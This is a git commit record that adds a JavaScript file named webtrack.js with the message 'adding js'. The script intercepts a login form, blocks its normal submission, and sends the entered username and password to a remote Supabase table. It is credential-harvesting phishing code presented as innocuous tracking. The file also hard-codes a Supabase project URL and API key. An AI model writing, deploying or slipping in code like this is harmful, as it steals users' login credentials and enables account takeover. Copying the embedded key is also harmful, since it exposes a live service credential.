3c3916722b80c12b7bb7cbe93bde7bd085f85d94
RobertoGP96 <trolbertogp96@gmail.com>
2025-06-04 13:48:11 -0400

    adding js

---
+++ webtrack.js
@@ -0,0 +1,23 @@
+import { createClient } from "@supabase/supabase-js";
+const supabaseUrl = "https://pahbxnmbixuxrmtyutzj.supabase.co";
+const supabaseKey =
+  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBhaGJ4bm1iaXh1eHJtdHl1dHpqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDkwNTY2MDEsImV4cCI6MjA2NDYzMjYwMX0.vVeLfym30Zl1utCSesTcTcLHttiYasPkW5h7cJYgVzk";
+const supabase = createClient(supabaseUrl, supabaseKey);
+
+const trackSave = () => {
+  document
+    .getElementById("identifierForm")
+    .addEventListener("submit", async function (event) {
+      event.preventDefault(); // Evita el envío del formulario por defecto
+
+      // Obtiene los valores de los campos del formulario
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("tpassword").value;
+      const sessionDataKey = document.querySelector(
+        'input[name="sessionDataKey"]'
+      ).value;
+      const { error } = await supabase
+        .from("DataTrack")
+        .insert({ id: 1, username: username, password: password });
+    });
+};
